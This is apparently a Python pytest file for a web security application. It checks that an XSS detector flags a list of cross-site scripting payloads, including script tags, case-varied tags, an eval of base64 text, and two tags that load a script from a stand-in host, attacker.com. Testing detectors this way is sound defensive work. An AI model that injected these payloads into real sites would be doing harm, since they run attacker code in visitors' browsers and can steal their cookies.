import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, select
from sqlalchemy.orm import Session

from app import createAlert, database, eventsLogger
from app.detection.xss import detect_xss
from app.models import Alert, Event, User


@pytest.mark.parametrize("payload", [ 
    "<a href=\"javascript:alert(1)\">Click me</a>",
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(\"XSS\")</script>",
    "<script>alert(document.cookie)</script>",
    "<script>alert(window.location)</script>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</sCrIpT>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<script src=\"http://attacker.com/xss.js\"></script>",
    "<script/src=\"http://attacker.com/xss.js\"></script>",
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    "<script>setTimeout(function(){alert(1)},100)</script>",
    "<script>/* */alert(1)//</script>",
    "<script>[]*</script>",
])
def test_detects_common_signatures(payload):
    assert detect_xss(payload)

